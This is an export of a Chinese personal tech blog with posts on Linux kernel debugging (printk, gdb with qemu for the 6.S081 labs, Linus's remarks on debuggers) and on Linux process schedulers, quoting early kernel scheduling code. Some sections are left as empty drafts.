<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMzNDA2Njg1Ng==">哔哩哔哩注册为什么要去做题？<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzIwMjY5NzcyL2xvZw==">知乎最近涌入了很多在校大学生，这会对知乎产生什么影响？<i class="fa fa-external-link-alt"></i></span> 这是一个2012年的问题，今天看起来有点苦涩<br><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI3MjAyNTA4L2Fuc3dlci8zNTgyNzU2Mw==">怎么找到知乎早期的经典回答？<i class="fa fa-external-link-alt"></i></span> 这是一个14年的问题<br><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzIyNjgyNTcz">佐藤謙一等人的离开是知乎的转折点吗？<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzIyNjc1Nzk2">佐藤謙一删掉所有知乎记录离开知乎的原因是什么？<i class="fa fa-external-link-alt"></i></span> <span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzIxNTc0NDU1">葛巾为什么离开知乎？<i class="fa fa-external-link-alt"></i></span> 同样是几个14年的问题<br><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzQyNjQ5MjU5Ny9hbnN3ZXIvMTU0MjYzMzE5Mw==">什么是「知乎遗风」，现在还有哪些知乎用户拥有这种「遗风」？<i class="fa fa-external-link-alt"></i></span> 这是一个2020年的问题</p>
]]></content>
      <categories>
        <category>不务正业系列</category>
      </categories>
      <tags>
        <tag>Archlinux</tag>
        <tag>manjaro</tag>
      </tags>
  </entry>
  <entry>
    <title>番外：Linux内核调试</title>
    <url>/kernel-debugging/</url>
    <content><![CDATA[<p>之前写那个Linux抢救和维护的时候提过一下，现在做6.S081的Lab又碰到的这个问题，单独开一篇记录一下（水平不够，调试来凑）</p>
<span id="more"></span>

<h2 id="printk"><a href="#printk" class="headerlink" title="printk()"></a>printk()</h2><p>如果内核的错误还没有严重到来不及输出错误信息，还是可以靠print大法调试的。</p>
<p>printk输出到日志的内容可以用<code>dmesg</code>，普通的驱动问题靠输出的log定位问题就可以了。比如我要找HDMI的log：<code>dmesg | grep HDMI</code>。如果信息还不够多就加一个参数<code>CONFIG_DEBUG_DRIVER</code>到<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvdGl0bGUvS2VybmVsX3BhcmFtZXRlcnM=">kernel parameter<i class="fa fa-external-link-alt"></i></span>里面，这会把来自Linux Kernel Driver Database的原始数据全都打印出来（非常非常多，除非写驱动的或者Debug找不到足够信息否则不要开）</p>
<p>printk有7个级别，见<span class="exturl" data-url="aHR0cHM6Ly93d3cua2VybmVsLm9yZy9kb2MvaHRtbC92NS4xMi1yYzMvY29yZS1hcGkvcHJpbnRrLWJhc2ljcy5odG1s">Message logging with printk<i class="fa fa-external-link-alt"></i></span>。从0-7打印信息逐渐增加，调试的时候选一个合适的就行了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">printk(KERN_WARNING <span class="string">&quot;这里好像有问题，打印一下&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="Kernel-Panic-后来不及printk"><a href="#Kernel-Panic-后来不及printk" class="headerlink" title="Kernel Panic 后来不及printk"></a>Kernel Panic 后来不及printk</h3><p>printk是异步的<br><code>printk.synchronous=1</code></p>
<p>printk()有一个问题，每次想添加printk()的时候都要重新编译（6.S081&#x2F;6.828用的教学xv6那种几千行代码的玩具操作系统还好办，Linux内核这样庞大的东西CPU不太好的时候要编译很久的）</p>
<h2 id="proc-sys等目录"><a href="#proc-sys等目录" class="headerlink" title="&#x2F;proc&#x2F;sys等目录"></a>&#x2F;proc&#x2F;sys等目录</h2><p>这几个目录比较重要，临时修改参数可以用</p>
<h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><p>systemtap，相当于一个kprobe的封装</p>
<h2 id="qemu等模拟器-虚拟机"><a href="#qemu等模拟器-虚拟机" class="headerlink" title="qemu等模拟器&#x2F;虚拟机"></a>qemu等模拟器&#x2F;虚拟机</h2><p>虚拟机里面比较简单，有很多方便的方案可以将日志、页表、堆栈调用给你打印出来。</p>
<h3 id="gdb-qemu"><a href="#gdb-qemu" class="headerlink" title="gdb+qemu"></a>gdb+qemu</h3><p>下面以6.S081&#x2F;6.828为例：</p>
<p>按照课程的推荐装一个合适的gdb（gdb要支持相应的架构，），比如我要调试的内核是RISC-Ⅴ的，在Archlinux下应该是<code>riscv64-linux-gnu-gdb</code>, 在Ubuntu20.04下可以用<code>gdb-multiarch</code>。</p>
<p>然后打开两个terminal，第一个执行<code>make qemu-gdb</code>启动qemu模拟器， 第二个执行gdb<code>gdb-multiarch</code>。</p>
<p>这样就可以愉快的用gdb调试了，具体操作见另一篇。（太长不看版，就是普通程序gdb怎么调试这里就怎么调呗）</p>
<h2 id="其他环境"><a href="#其他环境" class="headerlink" title="其他环境"></a>其他环境</h2><h3 id="物理机（比如Linux桌面发行版）"><a href="#物理机（比如Linux桌面发行版）" class="headerlink" title="物理机（比如Linux桌面发行版）"></a>物理机（比如Linux桌面发行版）</h3><p>这种比qemu模拟器里面的要麻烦很多，你可能来不及看到错误log就崩溃了，得借助kdump、crash等工具把崩溃信息记下来。</p>
<p>如果能进grub，</p>
<h3 id="开发板或裸机"><a href="#开发板或裸机" class="headerlink" title="开发板或裸机"></a>开发板或裸机</h3><p>ARM的板子就直接用Jlink呗。以前写的烧到板子上的东西都是不超过两千行的小玩意，没啥调试经验，不讲了。（当时全靠dmesg）</p>
<h2 id="调试的原理"><a href="#调试的原理" class="headerlink" title="调试的原理"></a>调试的原理</h2><p>这些内容由于我实在太菜，写不动了。写的不好，将就着看吧。稍微了解一下原理对使用这些调试工具有一些帮助</p>
<h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><p>gdb的实现利用了ptrace的systemcall</p>
<h3 id="printk-1"><a href="#printk-1" class="headerlink" title="printk"></a>printk</h3><p>直接看这两篇文章吧：<br><span class="exturl" data-url="aHR0cHM6Ly93d3cubGludXhwbHVtYmVyc2NvbmYub3JnL2V2ZW50LzQvY29udHJpYnV0aW9ucy8yOTAvYXR0YWNobWVudHMvMjc2LzQ2My9scGMyMDE5X2pvZ25lc3NfcHJpbnRrLnBkZg==">printk: Why is it so complicated?<i class="fa fa-external-link-alt"></i></span> Linux Plumbers Conf 的ppt<br><span class="exturl" data-url="aHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzgwMDk0Ni8=">Why printk() is so complicated (and how to fix it)<i class="fa fa-external-link-alt"></i></span>  </p>
<h3 id="systemtap"><a href="#systemtap" class="headerlink" title="systemtap"></a>systemtap</h3><h2 id="你真的需要Debugger吗"><a href="#你真的需要Debugger吗" class="headerlink" title="你真的需要Debugger吗"></a>你真的需要Debugger吗</h2><p>Linus在邮件<span class="exturl" data-url="aHR0cHM6Ly9sd24ubmV0LzIwMDAvMDkxNC9hL2x0LWRlYnVnZ2VyLnBocDM=">Re: Availability of kdb<i class="fa fa-external-link-alt"></i></span>里是这样说的：<code> I don&#39;t like debuggers. Never have, probably never will. I use gdb all the time, but I tend to use it not as a debugger, but as a disassembler on steroids that you can program.</code></p>
<p>这封邮件比较长，截取一段代表性观点</p>
<blockquote>
<p>I happen to believe that not having a kernel debugger forces people to think about their problem on a different level than with a debugger. I think that without a debugger, you don’t get into that mindset where you know how it behaves, and then you fix it from there. Without a debugger,you tend to think about problems another way. You want to understand things on a different <em>level</em>.</p>
</blockquote>
<p>系统编程不像平时糊个网站搓个脚本那样，不能过于依赖Debug，应该一开始就设计好，出bug说明设计有问题、写的人不仔细。把事情都想清楚写好了编译一次通过，这才是Linus认为的合格的(水平要达到不依赖debugger)</p>
<blockquote>
<p>you start being careful, or you start whining about a kernel debugger.</p>
</blockquote>
<blockquote>
<p>Quite frankly, I’d rather weed out the people who don’t start being<br>careful early rather than late. </p>
</blockquote>
<p>老派程序员里面很多经验丰富的大牛都不用debugger, 一种是习惯了print，另外很多典型的观点是Robe Pike这样的</p>
<blockquote>
<p>If you dive into the bug, you tend to fix the local issue in the code, but if you think about the bug first, how the bug came to be, you often find and correct a higher-level problem in the code that will improve the design and prevent further bugs.</p>
</blockquote>
<p>我试着不用gdb调试、语法高亮和代码补全做了6.S081的Lab1，结果相当惨烈。这几天回去翻出了藏在柜子里面的k&amp;r，从图书馆拿来了《c陷阱和指针》和《debug hacks》，并给VSCode启用了clangd自动补全并配置了断点调试。（我甚至想掏出clion了）</p>
<p>如果你像我一样菜，去找&#x2F;买个大屏幕（最好能竖过来），然后打开你的debugger<br>（强烈推荐4k显示器，画质飞跃，头也不疼眼也不花了）</p>
<p>（据说一个大的显示屏有buff加成，据说，据说再在旁边摆一个小显示器开个终端也不错）</p>
<p>当然，有的时候你也只是想找一下驱动的bug并汇报给厂家，或者你只是个普通用户，想检查一下内核更新后开不了机的问题；掏出调试工具吧！</p>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><p>《Debug Hacks 深入调试的技术和工具》 （吉冈弘隆） 这本书讲的很好，这还是之前我在图书馆乱逛无意间翻到的，结果发现是讲内核的，当时根本看不懂。今天又从图书馆翻出来了，发现讲的还挺好。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9sd24ubmV0LzIwMDAvMDkxNC9hL2x0LWRlYnVnZ2VyLnBocDM=">https://lwn.net/2000/0914/a/lt-debugger.php3<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cua2VybmVsLm9yZy9kb2MvaHRtbC92NS4xMi1yYzMvY29yZS1hcGkvcHJpbnRrLWJhc2ljcy5odG1s">https://www.kernel.org/doc/html/v5.12-rc3/core-api/printk-basics.html<i class="fa fa-external-link-alt"></i></span>  </p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cubGludXhwbHVtYmVyc2NvbmYub3JnL2V2ZW50LzQvY29udHJpYnV0aW9ucy8yOTAvYXR0YWNobWVudHMvMjc2LzQ2My9scGMyMDE5X2pvZ25lc3NfcHJpbnRrLnBkZg==">printk: Why is it so complicated?<i class="fa fa-external-link-alt"></i></span> Linux Plumbers Conf 的ppt<br><span class="exturl" data-url="aHR0cHM6Ly9sd24ubmV0L0FydGljbGVzLzgwMDk0Ni8=">Why printk() is so complicated (and how to fix it)<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMTIwMzI1MjIyNTA0L2h0dHA6Ly93d3cuaWJtLmNvbS9kZXZlbG9wZXJ3b3Jrcy9jbi9saW51eC9sLWtlcm5lbC1sb2dnaW5nLWFwaXMvaW5kZXguaHRtbA==">内核日志：API及其实现<i class="fa fa-external-link-alt"></i></span>  </p>
<p><span class="exturl" data-url="aHR0cHM6Ly9lbGludXgub3JnL0RlYnVnZ2luZ19ieV9wcmludGluZw==">https://elinux.org/Debugging_by_printing<i class="fa fa-external-link-alt"></i></span>  </p>
<p>另外<span class="exturl" data-url="aHR0cHM6Ly9lbGludXgub3JnL01haW5fUGFnZQ==">Embedded Linux Wiki<i class="fa fa-external-link-alt"></i></span>里面挺多东西都挺好的（你不搞嵌入式那当我没说）</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3RhbmdrZWdhZ2FsaWthaXd1L2FydGljbGUvZGV0YWlscy84NTcyMzY1">https://blog.csdn.net/tangkegagalikaiwu/article/details/8572365<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>Linux&amp;Unix</category>
      </categories>
      <tags>
        <tag>debug</tag>
        <tag>6.S081</tag>
        <tag>Linux</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux进程调度，从服务器到桌面</title>
    <url>/linux-processing-scheduling/</url>
    <content><![CDATA[<p>用了一周linux-ck和MuQSS，发现没有想象中的那么好。哦，这还要从一个麻醉师说起。</p>
<span id="more"></span>

<p>没仔细看调度器之前我以为Linux进程调度都是和内存管理一样很复杂的东西。实现比较简单的进程调度就几十行代码。CFS这种比较复杂的就不仔细说了、多核和分布式调度这些比较复杂的下面也不会多讲。（主要是我水平太菜了，怕讲错）</p>
<h2 id="进程调度简介"><a href="#进程调度简介" class="headerlink" title="进程调度简介"></a>进程调度简介</h2><p>进程是操作系统虚拟化出来的东西，</p>
<p>Linux里面基本不区分进程和线程，统称为task（任务）。下面的进程等词都指task。</p>
<p>CPU的资源是有限的，进程之间需要一个调度器来分配资源使用。最常见的调度器是Linux内核主线默认采用的CFS。</p>
<p>注：不要只盯着复杂度O(n), O(1), O(log n), 效果还是得看实测。引用一下cauche调度器readme里的一段话</p>
<p>O(n) sounds scary, but usually for a machine with 4 CPUS where it is used for desktop or mobile jobs, the maximum number of runnable tasks might not exceeds 10 (at the pick next run time) - the idle tasks are excluded since they are dequeued when sleeping and enqueued when they wake up.</p>
<p>在电脑桌面和手机、4核CPU使用场景，最多运行任务不超过10个。所以复杂度O(n)不一定比O(1)调度速度快。</p>
<h3 id="关于进程"><a href="#关于进程" class="headerlink" title="关于进程"></a>关于进程</h3><p>在<code>include/linux/sched.h</code>头文件里面有进程的定义（一个结构体来表示的task）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span></span></span><br></pre></td></tr></table></figure>

<p>Linux系统在启动的时候会首先执行<code>start_kernel()</code>函数<span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vbGludXgvdjUuNy1yYzEvc291cmNlL2luaXQvbWFpbi5j">init&#x2F;main.c<i class="fa fa-external-link-alt"></i></span>。</p>
<p>首先是<code>set_task_stack_end_magic(&amp;init_task)</code>创建一个叫<code>init_task</code>的进程，一般管它叫0号进程（也就是后面的idle进程）。</p>
<p>然后调用<code>sched_init();</code>函数初始化进程调度。</p>
<p>然后在<code>start_kernel()</code>函数最后调用<code>rest_init</code>, 两个<code>kernel_thread</code>分别创建了一号进程（<code>init</code>）和二号进程(<code>kthreadd</code>)。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">noinline <span class="type">void</span> __ref <span class="title function_">rest_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tsk</span>;</span></span><br><span class="line">  <span class="type">int</span> pid;</span><br><span class="line"></span><br><span class="line">  rcu_scheduler_starting();</span><br><span class="line">    ...........</span><br><span class="line">  pid = kernel_thread(kernel_init, <span class="literal">NULL</span>, CLONE_FS);</span><br><span class="line">  ...........</span><br><span class="line">  pid = kernel_thread(kthreadd, <span class="literal">NULL</span>, CLONE_FS | CLONE_FILES);</span><br><span class="line">  ...........</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一般1号进程是用户态进程，整个用户态的进程树都是它<code>fork</code>出来的。关于1号进程的介绍可以看看systemd作者写的<a href="http://0pointer.de/blog/projects/systemd.html"><span class="exturl" data-url="aHR0cDovLzBwb2ludGVyLm5ldC9ibG9nL3Byb2plY3RzL3N5c3RlbWQuaHRtbA==">Rethinking PID 1<i class="fa fa-external-link-alt"></i></span></a> 中文翻译: <span class="exturl" data-url="aHR0cDovL2thaXdhbmdjaGVuLmdpdGh1Yi5pby8yMDE0LzEwLzA4L3N5c3RlbWQuaHRtbA==">重新思考 1 号进程<i class="fa fa-external-link-alt"></i></span></p>
<p>2号进程是内核进程，负责管理和调度内核线程。</p>
<p>进程描述符里面有一些调度需要的信息，比如。</p>
<h3 id="初代调度器"><a href="#初代调度器" class="headerlink" title="初代调度器"></a>初代调度器</h3><p>初代调度器非常简单，就是一个runqueue（运行队列），源码在<span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vbGludXgvMC4xMS9zb3VyY2Uva2VybmVsL3NjaGVkLmM=">kernel&#x2F;sched.c<i class="fa fa-external-link-alt"></i></span>,   我们忽略掉系统调用和printk日志以及floppy之类的，只看调度部分：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  &#x27;schedule()&#x27; is the scheduler function. This is GOOD CODE! There</span></span><br><span class="line"><span class="comment"> * probably won&#x27;t be any reason to change this, as it should work well</span></span><br><span class="line"><span class="comment"> * in all circumstances (ie gives IO-bound processes good response etc).</span></span><br><span class="line"><span class="comment"> * The one thing you might take a look at is the signal-handler code here.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   NOTE!!  Task 0 is the &#x27;idle&#x27; task, which gets called when no other</span></span><br><span class="line"><span class="comment"> * tasks can run. It can not be killed, and it cannot sleep. The &#x27;state&#x27;</span></span><br><span class="line"><span class="comment"> * information in task[0] is never used.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">schedule</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i,next,c;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> ** <span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check alarm, wake up any interruptible tasks that have got a signal */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p)</span><br><span class="line">    <span class="keyword">if</span> (*p) &#123;</span><br><span class="line">      <span class="keyword">if</span> ((*p)-&gt;alarm &amp;&amp; (*p)-&gt;alarm &lt; jiffies) &#123;</span><br><span class="line">          (*p)-&gt;signal |= (<span class="number">1</span>&lt;&lt;(SIGALRM<span class="number">-1</span>));</span><br><span class="line">          (*p)-&gt;alarm = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">if</span> (((*p)-&gt;signal &amp; ~(_BLOCKABLE &amp; (*p)-&gt;blocked)) &amp;&amp;</span><br><span class="line">      (*p)-&gt;state==TASK_INTERRUPTIBLE)</span><br><span class="line">        (*p)-&gt;state=TASK_RUNNING;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* this is the scheduler proper: */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    c = <span class="number">-1</span>;</span><br><span class="line">    next = <span class="number">0</span>;</span><br><span class="line">    i = NR_TASKS;</span><br><span class="line">    p = &amp;task[NR_TASKS];</span><br><span class="line">    <span class="keyword">while</span> (--i) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!*--p)</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      <span class="keyword">if</span> ((*p)-&gt;state == TASK_RUNNING &amp;&amp; (*p)-&gt;counter &gt; c)</span><br><span class="line">        c = (*p)-&gt;counter, next = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (c) <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span>(p = &amp;LAST_TASK ; p &gt; &amp;FIRST_TASK ; --p)</span><br><span class="line">      <span class="keyword">if</span> (*p)</span><br><span class="line">        (*p)-&gt;counter = ((*p)-&gt;counter &gt;&gt; <span class="number">1</span>) +</span><br><span class="line">            (*p)-&gt;priority;</span><br><span class="line">  &#125;</span><br><span class="line">  switch_to(next);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就只有这么几行。也没有nice值和多核，甚至没有生命周期，还是很容易理解的。</p>
<p>jiffies是系统开机以来tick的次数（alarm&gt;jiffies说明过期了，重置为0）</p>
<p>counter是时间片，单位是tick（时钟滴答），调度器根据couter大小决定优先级（couter越大优先级越高）</p>
<p>NR_TASKS是task（进程）总数。</p>
<p>第一个循环是检查一遍<span class="exturl" data-url="aHR0cHM6Ly9tYW43Lm9yZy9saW51eC9tYW4tcGFnZXMvbWFuMi9hbGFybS4yLmh0bWw=">alarm()<i class="fa fa-external-link-alt"></i></span>函数，唤醒任何收到alarm传来的signal的没有被阻塞的tasks，将<code>TASK_INTERRUPTIBLE</code>（挂起）改为<code>TASK_RUNNING</code>可执行。</p>
<p>然后<code>while(1)</code> 这个死循环一直执行到关机，每次循环先<code>while (--i)</code>找出counter（时间片）最大的task。（couter越大说明）</p>
<p><code>if (c) break;</code>和下面的这些是说如果c为0（所有进程的counter用完了），就重新分配counter。</p>
<p>最后调用<code>switch_to(next)</code>切换进程。（切换到counter最大的一个）</p>
<p>然后还有几个函数，是几个状态的转换，也很简单。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sys_pause</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  current-&gt;state = TASK_INTERRUPTIBLE;</span><br><span class="line">  schedule();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sleep_on</span><span class="params">(<span class="keyword">struct</span> task_struct **p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!p)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (current == &amp;(init_task.task))</span><br><span class="line">    panic(<span class="string">&quot;task[0] trying to sleep&quot;</span>);</span><br><span class="line">  tmp = *p;</span><br><span class="line">  *p = current;</span><br><span class="line">  current-&gt;state = TASK_UNINTERRUPTIBLE;</span><br><span class="line">  schedule();</span><br><span class="line">  <span class="keyword">if</span> (tmp)小</span><br><span class="line">    tmp-&gt;state=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">interruptible_sleep_on</span><span class="params">(<span class="keyword">struct</span> task_struct **p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">tmp</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!p)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">if</span> (current == &amp;(init_task.task))</span><br><span class="line">    panic(<span class="string">&quot;task[0] trying to sleep&quot;</span>);</span><br><span class="line">  tmp=*p;</span><br><span class="line">  *p=current;</span><br><span class="line">repeat:  current-&gt;state = TASK_INTERRUPTIBLE;</span><br><span class="line">  schedule();</span><br><span class="line">  <span class="keyword">if</span> (*p &amp;&amp; *p != current) &#123;</span><br><span class="line">    (**p).state=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> repeat;</span><br><span class="line">  &#125;</span><br><span class="line">  *p=<span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">if</span> (tmp)</span><br><span class="line">    tmp-&gt;state=<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">wake_up</span><span class="params">(<span class="keyword">struct</span> task_struct **p)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (p &amp;&amp; *p) &#123;</span><br><span class="line">    (**p).state=<span class="number">0</span>;</span><br><span class="line">    *p=<span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个调度器复杂度是O(n)的（复杂度没啥用，因为NR_TASKS早期特别小）。只有分配的counter值作为调度优先级</p>
<p>0号进程的优先级是最低的（最后被调度）。在后面的调度器中0号进程根本不参与调度。</p>
<h3 id="O-n-调度器"><a href="#O-n-调度器" class="headerlink" title="O(n)调度器"></a>O(n)调度器</h3><p>早期的调度器是和UNIX的差不多，就是O(n)调度器。</p>
<p>O(n)调度器是用runqueue（运行队列），和初代调度器不同的是CPU每个核都有一个runqueue。</p>
<h3 id="O-1-调度器"><a href="#O-1-调度器" class="headerlink" title="O(1)调度器"></a>O(1)调度器</h3><p>2.6版本</p>
<p>O(1)调度器比较适合服务器，基本上做到了将I&#x2F;O利用率最大化。</p>
<p>静态优先级（一般叫nice值）</p>
<h3 id="CFS"><a href="#CFS" class="headerlink" title="CFS"></a>CFS</h3><p>CFS调度器（Completely Fair Scheduler），用的最广的一个（从2.6开始Linux内核主线默认就是他）。CFS的意思是完全公平调度器，完全公平是说每一个进程在一个周期时间内运行相同的时间。在一个生命周期<code>T</code>内，<code>N</code>个task占用CPU的时间均为$T&#x2F;N$</p>
<p>CFS是一个红黑树实现的。是几种调度器中实现很复杂的一个调度器，源码在这里：<span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vbGludXgvbGF0ZXN0L3NvdXJjZS9rZXJuZWwvc2NoZWQvZmFpci5j">sched_fair.c Linux Kernel Source<i class="fa fa-external-link-alt"></i></span></p>
<p>文档在这里：<span class="exturl" data-url="aHR0cHM6Ly93d3cua2VybmVsLm9yZy9kb2MvRG9jdW1lbnRhdGlvbi9zY2hlZHVsZXIvc2NoZWQtZGVzaWduLUNGUy50eHQ=">https://www.kernel.org/doc/Documentation/scheduler/sched-design-CFS.txt<i class="fa fa-external-link-alt"></i></span></p>
<p>调度实体sched_entity，虚拟运行时间vruntime</p>
<h3 id="RT调度器"><a href="#RT调度器" class="headerlink" title="RT调度器"></a>RT调度器</h3><p>实时调度器，Real Time Scheduler。一般使用优先级队列（priority queue）实现的</p>
<p>进程根据优先级（priority）</p>
<p>实时调度器调度的实时进程的优先级通常很高（优先级0-99，不同内核可能不太一样）</p>
<p>非实时的进程优先级在100-139</p>
<p>执行<code>ps</code>命令可以查看优先级，PRI这一列是优先级（priority），NI这一列是NICE值</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ps</span> -el</span><br><span class="line">F S   UID     PID    PPID  C PRI  NI ADDR SZ WCHAN  TTY          TIME CMD</span><br><span class="line">4 R     0       1       0  0  80   0 - 25249 -      ?        00:00:07 systemd</span><br><span class="line">1 S     0       2       0  0  80   0 -     0 -      ?        00:00:00 kthreadd</span><br><span class="line">1 I     0       3       2  0  60 -20 -     0 -      ?        00:00:00 rcu_gp</span><br><span class="line">1 I     0       4       2  0  60 -20 -     0 -      ?        00:00:00 rcu_par_gp</span><br><span class="line">1 I     0       6       2  0  60 -20 -     0 -      ?        00:00:00 kworker/0:0H-events_highpri</span><br><span class="line">1 I     0       8       2  0  60 -20 -     0 -      ?        00:00:00 mm_percpu_wq</span><br><span class="line">1 S     0       9       2  0  80   0 -     0 -      ?        00:00:00 rcu_tasks_rude_</span><br><span class="line">1 S     0      10       2  0  80   0 -     0 -      ?        00:00:00 rcu_tasks_trace</span><br><span class="line">1 S     0      11       2  0  80   0 -     0 -      ?        00:00:08 ksoftirqd/0</span><br><span class="line">1 I     0      12       2  0  80   0 -     0 -      ?        00:00:18 rcu_sched</span><br><span class="line">1 S     0      13       2  0 -40   - -     0 -      ?        00:00:00 migration/0</span><br><span class="line">1 S     0      14       2  0   9   - -     0 -      ?        00:00:00 idle_inject/0</span><br><span class="line">1 S     0      16       2  0  80   0 -     0 -      ?        00:00:00 cpuhp/0</span><br><span class="line">5 S     0      17       2  0  80   0 -     0 -      ?        00:00:00 cpuhp/1</span><br><span class="line">1 S     0      18       2  0   9   - -     0 -      ?        00:00:00 idle_inject/1</span><br></pre></td></tr></table></figure>

<h3 id="多核"><a href="#多核" class="headerlink" title="多核"></a>多核</h3><p>CPU的每个核都有一个runqueue</p>
<h3 id="组调度"><a href="#组调度" class="headerlink" title="组调度"></a>组调度</h3><p>本来打算先跳过这一部分的，以后写cgroup的时候再说。但是这个东西对桌面的优化很重要，比如这个很老的补丁。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cucGhvcm9uaXguY29tL3NjYW4ucGhwP3BhZ2U9YXJ0aWNsZSZpdGVtPWxpbnV4XzI2MzdfdmlkZW8mbnVtPTE=">The ~200 Line Linux Kernel Patch That Does Wonders<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tYXJjLmluZm8vP2w9bGludXgta2VybmVsJm09MTI4OTc4MzYxNzAwODk4Jnc9Mg==">Re: [RFC&#x2F;RFT PATCH v3] sched: automated per tty task groups<i class="fa fa-external-link-alt"></i></span> </p>
<p>现在Linux的调度策略比较多，不同用户通过组调度进行资源的分配和隔离。说到这里你是不是想起了cgroup，对，这个东西就是用cgroup实现的。</p>
<h3 id="其他的调度器"><a href="#其他的调度器" class="headerlink" title="其他的调度器"></a>其他的调度器</h3><p>官方不支持调度器像kernel module一样做成可插拔的，所以其他魔改的调度策略通常单独做一个内核。</p>
